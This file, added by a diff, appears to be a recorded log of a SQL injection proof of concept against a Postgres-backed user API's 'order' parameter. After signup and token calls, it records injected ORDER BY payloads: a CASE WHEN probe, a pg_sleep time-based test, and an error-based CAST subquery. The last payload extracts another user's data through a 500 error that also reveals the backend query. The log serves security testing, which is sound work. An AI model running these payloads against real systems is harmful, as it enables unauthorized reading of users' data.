@@ -1,0 +1,44 @@
+[
+  {
+    "request": "POST /v1/signup",
+    "status": 400,
+    "elapsed_s": 0.018,
+    "body": "{\"status_code\":400,\"error\":\"Field validation error\",\"details\":\"Key: 'SignupRequest.{{account}}.{{name}}' Error:Field validation for '{{name}}' failed on the 'unique' tag\\nKey: 'SignupRequest.{{user}}.{{email}}' Error:Field validation for '{{email}}' failed on the 'unique' tag\",\"stack_trace\":\"Key: 'SignupRequest.{{account}}.{{name}}' Error:Field validation for '{{name}}' failed on the 'unique' tag\\nKey: 'SignupRequest.{{user}}.{{email}}' Error:Field validation for '{{email}}' failed on the 'unique' tag\",\"fields\":[{\"field\":\"name\",\"value\":\"acct-attacker-orderby@example.test\",\"tag\":\"unique\",\"error\":\"name must contain unique values\",\"display\":\"name must contain unique values\"},{\"field\":\"email\",\"value\":\"attacker-orderby@example.test\",\"tag\":\"unique\",\"error\":\"email must contain unique values\",\"display\":\"email must contain unique values\"}]}"
+  },
+  {
+    "request": "POST /v1/signup",
+    "status": 400,
+    "elapsed_s": 0.001,
+    "body": "{\"status_code\":400,\"error\":\"Field validation error\",\"details\":\"Key: 'SignupRequest.{{account}}.{{name}}' Error:Field validation for '{{name}}' failed on the 'unique' tag\\nKey: 'SignupRequest.{{user}}.{{email}}' Error:Field validation for '{{email}}' failed on the 'unique' tag\",\"stack_trace\":\"Key: 'SignupRequest.{{account}}.{{name}}' Error:Field validation for '{{name}}' failed on the 'unique' tag\\nKey: 'SignupRequest.{{user}}.{{email}}' Error:Field validation for '{{email}}' failed on the 'unique' tag\",\"fields\":[{\"field\":\"name\",\"value\":\"acct-victim-orderby@example.test\",\"tag\":\"unique\",\"error\":\"name must contain unique values\",\"display\":\"name must contain unique values\"},{\"field\":\"email\",\"value\":\"victim-orderby@example.test\",\"tag\":\"unique\",\"error\":\"email must contain unique values\",\"display\":\"email must contain unique values\"}]}"
+  },
+  {
+    "request": "POST /v1/oauth/token",
+    "status": 200,
+    "elapsed_s": 0.079,
+    "body": "{\"access_token\":\"eyJhbGciOiJSUzI1NiIsImtpZCI6Ijc4ODhiZjYzLTk5MzgtNGYwOC04YjczLTNjYTc3ZWYyZjM2MSIsInR5cCI6IkpXVCJ9.eyJyb290X3VzZXJfaWQiOiIiLCJyb290X2FjY291bnRfaWQiOiIiLCJhY2NvdW50cyI6WyI0MjY4NmMwZi0wNjZiLTQ5MmItYjM0Yy0zYTMyYzljZDI0NmIiXSwicm9sZXMiOlsiYWRtaW4iXSwicHJlZnMiOnsidGltZXpvbmUiOiJBbWVyaWNhL0FuY2hvcmFnZSIsInByZWZfZGF0ZXRpbWVfZm9ybWF0IjoiMjAwNi0wMS0wMiBhdCAzOjA0UE0gTVNUIiwicHJlZl9kYXRlX2Zvcm1hdCI6IjIwMDYtMDEtMDIiLCJwcmVmX3RpbWVfZm9ybWF0IjoiMzowNFBNIE1TVCJ9LCJhdWQiOiI0MjY4NmMwZi0wNjZiLTQ5MmItYjM0Yy0zYTMyYzljZDI0NmIiLCJleHAiOjE3OTE3OTk5MzksImlhdCI6MTc5MTcxMzUzOSwic3ViIjoiYWMxNGFkMzktZjY1OS00YTcwLThlNTktNTNhYzc4NjkyYzA0In0.eHamRD6RVlFzlQbsWL2w014yKUeokv2WwzFz_ks2Ms61wniv2Bvxmbd4bgFgrBQKAxOPBFLoKslO4Tuh8kAAq35Ga3JF9mhm-c1TGtvM00zPmd2_vZjCsyzk9Pr9iGXzmCYcWR2nFe5QDS4RgKrUkuxr3mIIgtsWekLC14oYpHl5nhETZLCROzX-q6V7tE3FDFqVhZwkuOf0V67fm16fDOkp2xx-65WMd5kFF7V-L_FEjZ0FInn2emieQFyaCjQYqk0AGWw4V6nBQRHv65DkN3Oguy6ReOkOUUgOdyPaXxpEKUJU2sPO_Xr9ZRRJssZiyWLMvS1C2hsR4Xb25p4-uw\",\"token_type\":\"Bearer\",\"expiry\":\"2026-10-12T10:12:19.882481085Z\",\"ttl\":86400000000000,\"user_id\":\"ac14ad39-f659-4a70-8e59-53ac78692c04\",\"account_id\":\"42686c0f-066b-492b-b34c-3a32c9cd246b\"}"
+  },
+  {
+    "request": "GET /v1/users?order=email",
+    "status": 200,
+    "elapsed_s": 0.002,
+    "body": "[{\"id\":\"ac14ad39-f659-4a70-8e59-53ac78692c04\",\"name\":\"Attacker Orderby\",\"first_name\":\"Attacker\",\"last_name\":\"Orderby\",\"email\":\"attacker-orderby@example.test\",\"timezone\":\"\",\"created_at\":{\"value\":\"2026-10-11T02:06:26.849-08:00\",\"value_utc\":\"2026-10-11T10:06:26.849Z\",\"date\":\"2026-10-11\",\"time\":\"02:06:26\",\"kitchen\":\"2:06AM\",\"rfc1123\":\"Sun, 11 Oct 2026 02:06:26 AKDT\",\"local\":\"2026-10-11 at 2:06AM AKDT\",\"local_date\":\"2026-10-11\",\"local_time\":\"2:06AM AKDT\",\"now_time\":\"5 minutes ago\",\"now_rel_time\":\"5 minutes from now\",\"timezone\":\"America/Anchorage\"},\"updated_at\":{\"value\":\"2026-10-11T02:06:26.849-08:00\",\"value_utc\":\"2026-10-11T10:06:26.849Z\",\"date\":\"2026-10-11\",\"time\":\"02:06:26\",\"kitchen\":\"2:06AM\",\"rfc1123\":\"Sun, 11 Oct 2026 02:06:26 AKDT\",\"local\":\"2026-10-11 at 2:06AM AKDT\",\"local_date\":\"2026-10-11\",\"local_time\":\"2:06AM AKDT\",\"now_time\":\"5 minutes ago\",\"now_rel_time\":\"5 minutes from now\",\"timezone\":\"America/Anchorage\"},\"gravatar\":{\"small\":\"https://www.gravatar.com/avatar/58419cd63b34e3f99fc1a06a2d7ae879.jpg?s=30\",\"medium\":\"https://www.gravatar.com/avatar/58419cd63b34e3f99fc1a06a2d7ae879.jpg?s=80\"}}]"
+  },
+  {
+    "request": "GET /v1/users?order=%28CASE%20WHEN%201%3D0%20THEN%20email%20ELSE%20email%20END%29",
+    "status": 200,
+    "elapsed_s": 0.001,
+    "body": "[{\"id\":\"ac14ad39-f659-4a70-8e59-53ac78692c04\",\"name\":\"Attacker Orderby\",\"first_name\":\"Attacker\",\"last_name\":\"Orderby\",\"email\":\"attacker-orderby@example.test\",\"timezone\":\"\",\"created_at\":{\"value\":\"2026-10-11T02:06:26.849-08:00\",\"value_utc\":\"2026-10-11T10:06:26.849Z\",\"date\":\"2026-10-11\",\"time\":\"02:06:26\",\"kitchen\":\"2:06AM\",\"rfc1123\":\"Sun, 11 Oct 2026 02:06:26 AKDT\",\"local\":\"2026-10-11 at 2:06AM AKDT\",\"local_date\":\"2026-10-11\",\"local_time\":\"2:06AM AKDT\",\"now_time\":\"5 minutes ago\",\"now_rel_time\":\"5 minutes from now\",\"timezone\":\"America/Anchorage\"},\"updated_at\":{\"value\":\"2026-10-11T02:06:26.849-08:00\",\"value_utc\":\"2026-10-11T10:06:26.849Z\",\"date\":\"2026-10-11\",\"time\":\"02:06:26\",\"kitchen\":\"2:06AM\",\"rfc1123\":\"Sun, 11 Oct 2026 02:06:26 AKDT\",\"local\":\"2026-10-11 at 2:06AM AKDT\",\"local_date\":\"2026-10-11\",\"local_time\":\"2:06AM AKDT\",\"now_time\":\"5 minutes ago\",\"now_rel_time\":\"5 minutes from now\",\"timezone\":\"America/Anchorage\"},\"gravatar\":{\"small\":\"https://www.gravatar.com/avatar/58419cd63b34e3f99fc1a06a2d7ae879.jpg?s=30\",\"medium\":\"https://www.gravatar.com/avatar/58419cd63b34e3f99fc1a06a2d7ae879.jpg?s=80\"}}]"
+  },
+  {
+    "request": "GET /v1/users?order=%28CASE%20WHEN%20%28SELECT%201%20FROM%20pg_sleep%282%29%29%3A%3Aint%20%3D%201%20THEN%20email%20ELSE%20email%20END%29",
+    "status": 200,
+    "elapsed_s": 2.006,
+    "body": "[{\"id\":\"ac14ad39-f659-4a70-8e59-53ac78692c04\",\"name\":\"Attacker Orderby\",\"first_name\":\"Attacker\",\"last_name\":\"Orderby\",\"email\":\"attacker-orderby@example.test\",\"timezone\":\"\",\"created_at\":{\"value\":\"2026-10-11T02:06:26.849-08:00\",\"value_utc\":\"2026-10-11T10:06:26.849Z\",\"date\":\"2026-10-11\",\"time\":\"02:06:26\",\"kitchen\":\"2:06AM\",\"rfc1123\":\"Sun, 11 Oct 2026 02:06:26 AKDT\",\"local\":\"2026-10-11 at 2:06AM AKDT\",\"local_date\":\"2026-10-11\",\"local_time\":\"2:06AM AKDT\",\"now_time\":\"5 minutes ago\",\"now_rel_time\":\"5 minutes from now\",\"timezone\":\"America/Anchorage\"},\"updated_at\":{\"value\":\"2026-10-11T02:06:26.849-08:00\",\"value_utc\":\"2026-10-11T10:06:26.849Z\",\"date\":\"2026-10-11\",\"time\":\"02:06:26\",\"kitchen\":\"2:06AM\",\"rfc1123\":\"Sun, 11 Oct 2026 02:06:26 AKDT\",\"local\":\"2026-10-11 at 2:06AM AKDT\",\"local_date\":\"2026-10-11\",\"local_time\":\"2:06AM AKDT\",\"now_time\":\"5 minutes ago\",\"now_rel_time\":\"5 minutes from now\",\"timezone\":\"America/Anchorage\"},\"gravatar\":{\"small\":\"https://www.gravatar.com/avatar/58419cd63b34e3f99fc1a06a2d7ae879.jpg?s=30\",\"medium\":\"https://www.gravatar.com/avatar/58419cd63b34e3f99fc1a06a2d7ae879.jpg?s=80\"}}]"
+  },
+  {
+    "request": "GET /v1/users?order=%28SELECT%20CAST%28first_name%20AS%20integer%29%20FROM%20users%20WHERE%20email%3D%27victim-orderby%40example.test%27%29",
+    "status": 500,
+    "elapsed_s": 0.004,
+    "body": "Internal Server Error\nfind users failed: query - SELECT id,first_name,last_name,email,password_salt,password_hash,password_reset,timezone,created_at,updated_at,archived_at FROM users WHERE archived_at IS NULL AND id IN (SELECT user_id FROM users_accounts WHERE (account_id = ? OR user_id = ?)) ORDER BY (SELECT CAST(first_name AS integer) FROM users WHERE email='victim-orderby@example.test'): pq: invalid input syntax for type integer: \"VictimSecret\"\npq: invalid input syntax for type integer: \"VictimSecret\""
+  }
+]
